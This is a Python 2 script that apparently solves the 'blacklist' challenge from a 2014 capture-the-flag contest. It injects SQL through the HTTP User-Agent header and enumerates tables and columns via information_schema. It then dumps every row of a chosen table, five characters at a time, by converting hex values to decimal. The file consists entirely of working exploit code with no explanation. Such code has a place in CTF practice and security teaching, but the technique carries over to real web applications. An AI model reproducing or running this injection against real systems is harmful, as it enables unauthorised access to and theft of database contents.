import urllib2
from time import sleep

URI = 'http://blacklist.adctf2014.katsudon.org/'
TABLE_SCHEMA = 'blacklist'


def communicate(code):
    req = urllib2.Request(URI, None, {'User-agent':code})
    res = urllib2.urlopen(req)
    sleep(1)
    return res.read().split('\n')[10]

def SQLinjection(items):
    sql = "'+(select length(group_concat("+items['column']+")) from (select "+items['column']+" from "+items['table']+(" where "+items['where'] if 'where' in items else '')+(" "+items['others'] if 'others' in items else "")+") sub )+'"
    #print sql
    new_entry = communicate(sql)

    DATA=''
    for i in range(1,int(new_entry.split('"')[1])+1,5):
        sql = "'+conv(hex((select substr(group_concat(concat("+items['column']+")),"+str(i)+",5) from (select "+items['column']+" from "+items['table']+(" where "+items['where'] if 'where' in items else '')+(" "+items['others'] if 'others' in items else "")+") sub )),16,10)+'"
        #print sql
        data = int(communicate(sql).split('"')[1])
        DATA += hex(data)[2:-1 if 'L' in hex(data) else None].decode('hex')
    return DATA.split(',')

def getTables():
    items = {'column':"table_name",'table':"information_schema.tables",'where':"table_schema='"+TABLE_SCHEMA+"'"}
    #items = {'column':"table_name",'table':"information_schema.tables",'others':"limit 5,1"}
    return SQLinjection(items)
    
def getColumns(TABLE_NAME):
    items = {'column':"column_name",'table':"information_schema.columns",'where':"table_schema='"+TABLE_SCHEMA+"' and table_name='"+TABLE_NAME+"'"}
    return SQLinjection(items)

def dump(TABLE_NAME,COLUMN_NAME,OTHERS):
    items = {'column':COLUMN_NAME,'table':TABLE_NAME,'others':OTHERS}
    return SQLinjection(items)

def dump_all(TABLE_NAME):
    All_Columns = getColumns(TABLE_NAME)
    print 'Columns\t: '+str(All_Columns)
    
    sql = "'+(select table_rows from information_schema.tables where table_schema='"+TABLE_SCHEMA+"' and table_name='"+TABLE_NAME+"')+'"
    length = communicate(sql).split('"')[1]
    print length+' entries exist'
    
    for i in range(int(length)):
        print dump(TABLE_NAME,",".join(["`"+column+"`" for column in All_Columns]),"limit "+str(i)+",1")


if __name__ == '__main__':
    All_Tables = getTables()

    print 'Tables\t: '+str(All_Tables)
    table=raw_input('>>')
    
    if table in All_Tables:
        dump_all(table)
